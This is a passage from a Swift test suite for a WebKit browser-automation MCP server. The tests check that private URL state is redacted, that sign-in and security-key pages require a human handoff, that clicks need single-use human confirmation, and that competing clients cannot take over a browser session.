      baseURL: URL(string: "https://fixture.invalid/default-wire-budget"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let response = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let structured = try object(try object(response["result"])["structuredContent"])
    let encoded = try JSONEncoder().encode(response)

    #expect(structured["totalElementCount"] == .int(300))
    #expect(structured["nextElementOffset"] == .int(150))
    let elements = try array(structured["elements"])
    #expect(elements.count == 150)
    #expect(try object(elements[0])["locatorRecipe"] == nil)
    #expect(try object(elements[0])["locatorQuality"] != nil)
    #expect(encoded.count <= 1_048_576)
  }

  @Test("Modern compact observations factor provenance and avoid duplicate JSON text")
  func compactObservation() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      """
      <section aria-label="API Tokens"><h2>API Tokens</h2>
        <a href="/tokens?team=private-value">Open</a>
      </section>
      """,
      baseURL: URL(string: "https://fixture.invalid/settings"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))

    let response = try await toolCall(
      server, id: 2, name: "browser_observe",
      arguments: [
        "session_id": .string(sessionID),
        "compact": .bool(true),
        "fields": .array([
          .string("role"), .string("name"), .string("href"), .string("context"),
          .string("locator_quality"),
        ]),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])
    #expect(structured["compact"] == .bool(true))
    #expect(try object(structured["document"])["provenance"] != nil)
    let rows = try array(structured["elements"])
    let row = try object(
      try #require(
        rows.first { value in
          (try? object(value)["role"]) == .string("link")
        }))
    #expect(row["role"] == .string("link"))
    #expect(row["href"] == .string("https://fixture.invalid/tokens?team=<redacted>"))
    #expect(row["locatorQuality"] != nil)
    let contentRows = try array(result["content"])
    let content = try object(contentRows[0])
    #expect(content["text"] == .string("Compact structured result available in structuredContent."))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains("private-value"))

    let inspected = try await toolCall(
      server, id: 3, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(structured["observationID"])),
        "element_id": .string(try string(row["elementID"])),
      ])
    let inspection = try object(try object(inspected["result"])["structuredContent"])
    #expect(
      try object(inspection["stableAttributes"])["href"]
        == .string("https://fixture.invalid/tokens?team=<redacted>"))
    #expect(inspection["arbitrarySelectorSupported"] == .bool(false))
    #expect(inspection["javascriptEvaluationSupported"] == .bool(false))

    _ = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(sessionID), "compact": .bool(true)])
    let stale = try await toolCall(
      server, id: 5, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(structured["observationID"])),
        "element_id": .string(try string(row["elementID"])),
      ])
    #expect(try object(stale["error"])["code"] == .int(-32602))
  }

  @Test("Authentication origins expose only a sanitized handoff requirement")
  func authenticationOriginPolicy() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    let secret = "server-query-state-must-not-escape"
    _ = try await runtime.loadHTML(
      """
      <div role="progressbar"></div>
      <form hidden><input name="csrfToken" value="hidden-server-secret"></form>
      """,
      baseURL: URL(string: "https://idmsa.apple.com/IDMSWebAuth/signin?state=\(secret)"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    let statusContent = try object(try object(status["result"])["structuredContent"])
    #expect(statusContent["currentURL"] == .string("https://idmsa.apple.com"))

    for (offset, name) in [
      "browser_observe",
      "browser_read_text",
      "browser_capture",
      "browser_scroll",
      "element_scroll_into_view",
      "browser_act",
      "browser_download",
      "browser_upload",
      "browser_fill_siliconpass",
    ].enumerated() {
      let response = try await toolCall(
        server,
        id: Int64(3 + offset),
        name: name,
        arguments: ["session_id": .string(sessionID)]
      )
      let result = try object(response["result"])
      #expect(result["isError"] == .bool(true))
      let structured = try object(result["structuredContent"])
      #expect(structured["status"] == .string("authentication_origin_requires_human_handoff"))
      #expect(structured["origin"] == .string("https://idmsa.apple.com"))
      #expect(structured["auth_ui_state"] == .string("auth_ui_not_ready"))
      #expect(structured["control_state"] == .string("human_controlled"))
      #expect(structured["selected_backend"] == .string("native_webkit"))
      #expect(structured["required_internal_backend"] == .string("native_handoff"))
      #expect(structured["backend_transition"] == .string("human_handoff_required"))
      #expect(structured["session_transfer_supported"] == .bool(false))
      #expect(structured["credential_transfer_supported"] == .bool(false))
      let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
      #expect(!encoded.contains(secret))
      #expect(!encoded.contains("hidden-server-secret"))
      #expect(!encoded.contains("IDMSWebAuth"))
    }
  }

  @Test("WebAuthn controls report a full-browser recovery path")
  func webAuthnControlReportsFullBrowserRecovery() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])
    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<div>Verify with a security key</div>",
      baseURL: URL(string: "https://dash.cloudflare.com/two-factor"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )

    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_observe",
      arguments: ["session_id": .string(sessionID)]
    )
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("full_browser_required"))
    #expect(structured["origin"] == .string("https://dash.cloudflare.com"))
    #expect(structured["required_internal_backend"] == .string("safari_compatibility"))
    #expect(
      structured["recommended_user_action"]
        == .string("continue_in_safari_or_another_full_browser"))
    #expect(structured["session_transfer_supported"] == .bool(false))
    #expect(structured["credential_transfer_supported"] == .bool(false))
  }

  @Test("Safari compatibility handoff keeps the private URL outside MCP")
  func safariCompatibilityHandoffKeepsPrivateURLLocal() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let privateState = "private-query-state"
    _ = try await runtime.loadHTML(
      "<div>Verify with a security key</div>",
      baseURL: URL(
        string: "https://dash.cloudflare.com/two-factor?state=\(privateState)"),
      timeout: .seconds(3),
      quietWindow: .milliseconds(40)
    )
    let confirmation = ConfirmationPresenterStub(responses: [true])
    let safari = SafariCompatibilityPresenterStub()
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmation,
      safariCompatibilityPresenter: safari
    )

    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("compatibility_start"),
        "session_id": .string(handle.rawValue.uuidString),
      ]
    )
    let result = try object(response["result"])
    #expect(result["isError"] == nil)
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("safari_compatibility_handoff_started"))
    #expect(structured["safari_control_supported"] == .bool(false))
    #expect(structured["mcp_resume_supported"] == .bool(false))
    #expect(structured["manual_web_completion_required"] == .bool(true))
    #expect(try string(structured["instructions"]).contains("cannot observe or control Safari"))
    #expect(structured["origin"] == .string("https://dash.cloudflare.com"))
    #expect(structured["handoff_backend"] == .string("safari"))
    #expect(structured["opened"] == .bool(true))
    #expect(structured["session_transfer_supported"] == .bool(false))
    #expect(structured["cookie_transfer_supported"] == .bool(false))
    #expect(structured["credential_transfer_supported"] == .bool(false))
    #expect(safari.openedURLs.count == 1)
    #expect(safari.openedURLs.first?.query == "state=\(privateState)")
    #expect(confirmation.requests.count == 1)
    #expect(!confirmation.requests[0].message.contains(privateState))
    #expect(confirmation.requests[0].message.contains("https://dash.cloudflare.com"))
    #expect(!confirmation.requests[0].message.contains("(restriction.origin)"))

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ]
    )
    let statusContent = try object(try object(status["result"])["structuredContent"])
    #expect(statusContent["safari_compatibility_handoff_active"] == .bool(true))

    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(privateState))
    #expect(!encoded.contains("two-factor"))
  }

  @Test("Cross-origin redirects return only sanitized origins")
  func redirectRequiresHumanApprovalResult() throws {
    let server = try WebKitMCPServer()
    let result = try object(
      server.redirectApprovalResult(
        fromOrigin: "https://developer.apple.com",
        toOrigin: "https://idmsa.apple.com",
        modern: true
      ))
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["status"] == .string("redirect_requires_human_approval"))
    #expect(structured["from_origin"] == .string("https://developer.apple.com"))
    #expect(structured["to_origin"] == .string("https://idmsa.apple.com"))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains("IDMSWebAuth"))
    #expect(!encoded.contains("?"))
  }

  @Test("Authentication navigation approval omits path and query")
  func authenticationNavigationApprovalIsSanitized() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let server = WebKitMCPServer(registry: registry)
    let secret = "approval-query-state-must-not-escape"
    let prepared = try await toolCall(
      server,
      id: 1,
      name: "browser_navigate",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "url": .string(
          "https://idmsa.apple.com/IDMSWebAuth/signin?state=\(secret)"),
        "approval_mode": .string("mcp"),
      ]
    )
    let result = try object(prepared["result"])
    let requests = try object(result["inputRequests"])
    let confirmation = try object(requests["confirmation"])
    let message = try string(try object(confirmation["params"])["message"])
    #expect(message.contains("https://idmsa.apple.com"))
    #expect(!message.contains("IDMSWebAuth"))
    #expect(!message.contains(secret))
    #expect(!message.contains("?state="))
  }

  @Test("Session state travels through an explicit tool argument")
  func explicitSessionHandle() async throws {
    let server = try WebKitMCPServer()
    let profiles = try await toolCall(
      server, id: 0, name: "browser_session", arguments: ["operation": .string("profiles")])
    let profileResult = try object(try object(profiles["result"])["structuredContent"])
    #expect(try array(profileResult["profiles"]).contains(.string("default")))
    #expect(profileResult["contains_credentials"] == .bool(false))
    let opened = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: ["operation": .string("open"), "profile_id": .string("default")])
    let openResult = try object(try object(opened["result"])["structuredContent"])
    let sessionID = try string(openResult["session_id"])
    #expect(UUID(uuidString: sessionID) != nil)
    #expect(openResult["profile_id"] == .string("default"))
    #expect(openResult["execution_policy"] == .string("auto"))
    #expect(openResult["selected_backend"] == .string("native_webkit"))

    let status = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    let statusResult = try object(try object(status["result"])["structuredContent"])
    #expect(statusResult["sessionID"] == .string(sessionID))
    #expect(statusResult["selected_backend"] == .string("native_webkit"))

    _ = try await toolCall(
      server,
      id: 3,
      name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)]
    )
    let afterClose = try await toolCall(
      server,
      id: 4,
      name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)]
    )
    #expect(try object(afterClose["result"])["isError"] == .bool(true))
  }

  @Test("Native confirmation status is observable and cancellation is explicit")
  func nativeConfirmationStatusAndCancel() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: [], state: .pending)
    let server = WebKitMCPServer(
      registry: registry, confirmationPresenter: presenter)

    let status = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("status"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let statusResult = try object(try object(status["result"])["structuredContent"])
    #expect(
      statusResult["native_confirmation_state"]
        == .string("pending_native_confirmation"))
    #expect(statusResult["native_confirmation_cancel_available"] == .bool(true))

    let cancelled = try await toolCall(
      server,
      id: 2,
      name: "browser_session",
      arguments: [
        "operation": .string("confirmation_cancel"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let cancelledResult = try object(
      try object(cancelled["result"])["structuredContent"])
    #expect(cancelledResult["cancel_requested"] == .bool(true))
    #expect(presenter.state == .idle)
  }

  @Test("Profiles advertise only executable policies and disclose privacy limits")
  func profilesAdvertiseOnlyExecutablePolicies() async throws {
    let server = try WebKitMCPServer()
    let response = try await toolCall(
      server,
      id: 1,
      name: "browser_session",
      arguments: [
        "operation": .string("profiles")
      ]
    )
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(
      structured["available_execution_policies"]
        == .array([.string("auto"), .string("trusted_local")]))
    #expect(structured["authenticated_origins"] == .array([]))
    #expect(
      structured["authenticated_origins_status"]
        == .string("not_observable_without_inspecting_credentials_or_cookies"))
    let unavailable = try object(structured["unavailable_execution_policies"])
    #expect(unavailable["compatibility"] != nil)
    #expect(unavailable["isolated_read_only"] != nil)

    let unknown = try await toolCall(
      server, id: 2, name: "not_a_tool", arguments: [:])
    let unknownResult = try object(unknown["result"])
    let error = try object(unknownResult["structuredContent"])
    #expect(unknownResult["isError"] == .bool(true))
    #expect(error["code"] == .string("tool_error"))
    #expect(error["message"] != nil)
    #expect(error["remediation"] != nil)
    #expect(error["holder"] == .null)
  }

  @Test("A competing host gets holder details and may wait without stealing the lease")
  func hostBusyIsStructuredAndWaitable() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-server-host-lock-\(UUID().uuidString)", isDirectory: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let lockURL = directory.appendingPathComponent("controller.lock")
    let firstRegistry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true, hostControllerLockURL: lockURL)
    let secondRegistry = try WebKitSessionRegistry(
      enforceHostExclusiveSession: true, hostControllerLockURL: lockURL)
    let firstClient = WebKitMCPServer(registry: firstRegistry)
    let secondClient = WebKitMCPServer(registry: secondRegistry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let firstState = try object(
      try object(firstOpen["result"])["structuredContent"])
    let firstHandle = WebKitSessionHandle(
      rawValue: try #require(UUID(uuidString: try string(firstState["session_id"]))))

    let externalStatus = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("status")])
    let externalState = try object(
      try object(externalStatus["result"])["structuredContent"])
    #expect(externalState["status"] == .string("host_controller_busy"))
    #expect(externalState["control_available"] == .bool(false))
    #expect(try object(externalState["holder"])["client_name"] == .string("tests"))

    let busy = try await toolCall(
      secondClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("open")])
    let blocked = try object(try object(busy["result"])["structuredContent"])
    #expect(blocked["code"] == .string("host_controller_busy"))
    #expect(blocked["message"] != nil)
    #expect(blocked["remediation"] != nil)
    let holder = try object(blocked["holder"])
    #expect(holder["client_name"] == .string("tests"))
    #expect(holder["pid"] == .int(Int64(getpid())))

    let releaseTask = Task { @MainActor in
      try await Task.sleep(for: .milliseconds(150))
      try firstRegistry.close(firstHandle)
    }
    let waited = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("open"),
        "wait_timeout_ms": .int(1_000),
      ])
    let waitedState = try object(
      try object(waited["result"])["structuredContent"])
    try await releaseTask.value
    #expect(waitedState["control_available"] == .bool(true))
    #expect(secondRegistry.count == 1)
  }

  @Test("A durable host reuses its live browser but invalidates client observations")
  func durableBrowserReconnect() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(
      registry: registry,
      preserveBrowserOnClose: true
    )
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let first = try object(try object(opened["result"])["structuredContent"])
    let sessionID = try string(first["session_id"])
    #expect(first["reused"] == .bool(false))

    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<button aria-label='Continue'>Continue</button>",
      baseURL: URL(string: "https://fixture.invalid/session"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    _ = try await runtime.webView.evaluateJavaScript(
      "sessionStorage.setItem('durable-browser-proof', 'alive')")
    let observed = try await toolCall(
      server,
      id: 2,
      name: "browser_observe",
      arguments: ["session_id": .string(sessionID)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])

    let closed = try await toolCall(
      server,
      id: 3,
      name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)]
    )
    #expect(
      try object(try object(closed["result"])["structuredContent"])["browser_preserved"]
        == .bool(true))
    await server.prepareForClientReconnect()

    let reopened = try await toolCall(
      server, id: 4, name: "browser_session", arguments: ["operation": .string("open")])
    let second = try object(try object(reopened["result"])["structuredContent"])
    #expect(second["session_id"] == .string(sessionID))
    #expect(second["reused"] == .bool(true))
    let durableProof =
      try await runtime.webView.evaluateJavaScript(
        "sessionStorage.getItem('durable-browser-proof')") as? String
    #expect(durableProof == "alive")

    let staleAction = try await toolCall(
      server,
      id: 5,
      name: "browser_act",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string("e1"),
        "operation": .string("click"),
        "idempotency_key": .string("must-not-cross-reconnect"),
      ]
    )
    #expect(try object(staleAction["error"])["code"] == .int(-32602))
  }

  @Test("A second durable client cannot navigate or invalidate the owned browser")
  func durableMultiClientAuthorityIsolation() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let secondClient = WebKitMCPServer(durableRegistry: registry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let first = try object(try object(firstOpen["result"])["structuredContent"])
    let sessionID = try string(first["session_id"])
    #expect(first["reused"] == .bool(false))
    #expect(first["control_available"] == .bool(true))

    let publicStatus = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("status")])
    let publicState = try object(
      try object(publicStatus["result"])["structuredContent"])
    #expect(publicState["session_id"] == .string(sessionID))
    #expect(publicState["session_owner_state"] == .string("owned_elsewhere"))
    let holder = try object(publicState["holder"])
    #expect(holder["client_name"] == .string("tests"))
    #expect(holder["pid"] == .int(Int64(getpid())))
    #expect(holder["age_ms"] != nil)
    #expect(holder["inactive_ms"] != nil)
    #expect(holder["policy"] == .string("auto"))

    let runtime = try registry.runtime(
      for: WebKitSessionHandle(rawValue: try #require(UUID(uuidString: sessionID))))
    _ = try await runtime.loadHTML(
      "<button aria-label='Shared browser'>Shared browser</button>",
      baseURL: URL(string: "https://fixture.invalid/shared"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))

    let firstObservation = try await toolCall(
      firstClient, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let firstObservationID = try string(
      object(try object(firstObservation["result"])["structuredContent"])["observationID"])

    let secondOpen = try await toolCall(
      secondClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("open")])
    let second = try object(try object(secondOpen["result"])["structuredContent"])
    #expect(second["session_id"] == .string(sessionID))
    #expect(second["reused"] == .bool(true))
    #expect(second["control_available"] == .bool(false))

    let blockedHandoff = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let handoffState = try object(
      try object(blockedHandoff["result"])["structuredContent"])
    #expect(handoffState["status"] == .string("session_in_use"))
    #expect(handoffState["wait_only"] == .bool(true))
    #expect(handoffState["resume_token"] == nil)
    #expect(
      try registry.runtime(
        for: WebKitSessionHandle(rawValue: #require(UUID(uuidString: sessionID)))
      ).interactionControlState() == .agentControlled)

    let blockedObservation = try await toolCall(
      secondClient, id: 5, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let blocked = try object(try object(blockedObservation["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["code"] == .string("session_in_use"))
    #expect(blocked["message"] != nil)
    #expect(blocked["remediation"] != nil)
    #expect(blocked["holder"] != nil)
    #expect(blocked["wait_only"] == .bool(true))

    let firstStillFresh = try await toolCall(
      firstClient, id: 6, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(sessionID),
        "observation_id": .string(firstObservationID),
        "element_id": .string("e1"),
      ])
    #expect(try object(firstStillFresh["result"])["isError"] == nil)

    await firstClient.prepareForClientReconnect()
    let secondStillConnected = try await toolCall(
      secondClient, id: 7, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    #expect(try object(secondStillConnected["result"])["isError"] == nil)
  }

  @Test("A local human may transfer an idle session between durable clients")
  func durableClientHandoff() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let presenter = ConfirmationPresenterStub(responses: [true])
    let secondClient = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: presenter,
      preserveBrowserOnClose: true)

    let opened = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(opened["result"])["structuredContent"])["session_id"])

    let handoff = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("client_handoff"),
        "session_id": .string(sessionID),
      ])
    let handoffState = try object(
      try object(handoff["result"])["structuredContent"])
    #expect(handoffState["status"] == .string("ownership_transferred"))
    #expect(handoffState["control_available"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(presenter.requests.first?.title == "Transfer WebKitUI Control")

    let oldOwner = try await toolCall(
      firstClient, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let oldState = try object(
      try object(oldOwner["result"])["structuredContent"])
    #expect(oldState["code"] == .string("session_in_use"))

    let newOwner = try await toolCall(
      secondClient, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    #expect(try object(newOwner["result"])["isError"] == nil)
  }

  @Test("A second durable client cannot replace an active handoff capability")
  func durableMultiClientHandoffOwnership() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(durableRegistry: registry)
    let secondClient = WebKitMCPServer(durableRegistry: registry)

    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(firstOpen["result"])["structuredContent"])["session_id"])
    let secondOpen = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("open")])
    #expect(
      try object(try object(secondOpen["result"])["structuredContent"])["session_id"]
        == .string(sessionID))

    let firstStart = try await toolCall(
      firstClient, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let firstToken = try string(
      object(try object(firstStart["result"])["structuredContent"])["resume_token"])

    let secondStart = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_start"), "session_id": .string(sessionID),
      ])
    let blocked = try object(try object(secondStart["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["wait_only"] == .bool(true))
    #expect(blocked["resume_token"] == nil)
    #expect(try string(blocked["safe_next_step"]).contains("do not navigate"))

    _ = try await toolCall(
      secondClient, id: 5, name: "browser_session",
      arguments: ["operation": .string("close"), "session_id": .string(sessionID)])

    let firstStatus = try await toolCall(
      firstClient, id: 6, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(firstToken),
      ])
    #expect(
      try object(try object(firstStatus["result"])["structuredContent"])["resume_token_state"]
        == .string("active"))
  }

  @Test("A second durable client cannot create a competing multi-round handoff")
  func durableMultiClientRoundTripHandoffOwnership() async throws {
    let registry = try WebKitSessionRegistry()
    let firstClient = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, preserveBrowserOnClose: true)
    let secondClient = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, preserveBrowserOnClose: true)
    let firstOpen = try await toolCall(
      firstClient, id: 1, name: "browser_session",
      arguments: ["operation": .string("open")])
    let sessionID = try string(
      object(try object(firstOpen["result"])["structuredContent"])["session_id"])
    _ = try await toolCall(
      secondClient, id: 2, name: "browser_session",
      arguments: ["operation": .string("open")])

    let firstStart = try await toolCall(
      firstClient, id: 3, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    #expect(try object(firstStart["result"])["resultType"] == .string("input_required"))

    let secondStart = try await toolCall(
      secondClient, id: 4, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    let blocked = try object(try object(secondStart["result"])["structuredContent"])
    #expect(blocked["status"] == .string("session_in_use"))
    #expect(blocked["wait_only"] == .bool(true))
    #expect(try object(secondStart["result"])["requestState"] == nil)
  }

  @Test("Legacy initialize remains available without contaminating modern results")
  func legacyCompatibility() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server,
      id: 1,
      method: "initialize",
      params: .object(["protocolVersion": .string("2025-11-25")]),
      modern: false
    )
    let result = try object(response["result"])
    #expect(result["protocolVersion"] == .string("2025-11-25"))
    #expect(
      try object(result["serverInfo"])["version"] == .string(WebKitUIRelease.version)
    )
    #expect(result["resultType"] == nil)
    #expect(result["_meta"] == nil)

    let fallback = try await call(
      server,
      id: 2,
      method: "initialize",
      params: .object(["protocolVersion": .string("2026-07-28")]),
      modern: false
    )
    #expect(try object(fallback["result"])["protocolVersion"] == .string("2025-11-25"))

    let older = try await call(
      server,
      id: 3,
      method: "initialize",
      params: .object(["protocolVersion": .string("2025-06-18")]),
      modern: false
    )
    #expect(try object(older["result"])["protocolVersion"] == .string("2025-06-18"))

    let progressMetadata = try await rawCall(
      server,
      id: 4,
      method: "tools/list",
      params: .object([
        "_meta": .object(["progressToken": .string("legacy-progress")])
      ])
    )
    let progressResult = try object(progressMetadata["result"])
    #expect(progressResult["tools"] != nil)
    #expect(progressResult["resultType"] == nil)
    #expect(progressResult["_meta"] == nil)
  }

  @Test("Modern ping is not part of the stateless protocol")
  func modernPingRejected() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server, id: 1, method: "ping", params: .object([:]), modern: true)
    #expect(try object(response["error"])["code"] == .int(-32601))
  }

  @Test("Multi-round tools require the elicitation capability")
  func modernElicitationCapabilityRequired() async throws {
    let server = try WebKitMCPServer()
    let response = try await rawCall(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"),
        "arguments": .object(["approval_mode": .string("mcp")]),
        "_meta": .object([
          "io.modelcontextprotocol/protocolVersion": .string("2026-07-28"),
          "io.modelcontextprotocol/clientCapabilities": .object([:]),
        ]),
      ])
    )
    let error = try object(response["error"])
    #expect(error["code"] == .int(-32021))
    #expect(try object(error["data"])["requiredCapabilities"] != nil)
  }

  @Test("Actuation requires one bound, single-use human confirmation")
  func actuationConfirmation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let firstElement = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(observationID),
      "element_id": try firstElement["elementID"].map { .string(try string($0)) } ?? .null,
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("confirm-once"),
      "postcondition": .object([
        "type": .string("url_equals"),
        "value": .string("https://example.test/done"),
      ]),
    ]
    let first = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(first["result"])
    #expect(required["resultType"] == .string("input_required"))
    let requestState = try string(required["requestState"])
    let inputRequests = try object(required["inputRequests"])
    #expect(try object(inputRequests["confirmation"])["method"] == .string("elicitation/create"))

    let declined = try await call(
      server,
      id: 3,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object(["action": .string("decline")])
        ]),
      ]),
      modern: true
    )
    #expect(try object(declined["result"])["isError"] == .bool(true))

    let replay = try await call(
      server,
      id: 4,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"), "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )
    #expect(try object(replay["error"])["code"] == .int(-32602))
  }

  @Test("A confirmed fill verifies the same semantic target's exact value")
  func verifiedFill() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='name'>Name</label><input id='name'>
      <script>
        const input = document.getElementById('name');
        input.addEventListener('input', () => {
          const marker = document.createElement('button');
          marker.textContent = 'Inserted by framework';
          document.body.prepend(marker);
          const replacement = input.cloneNode();
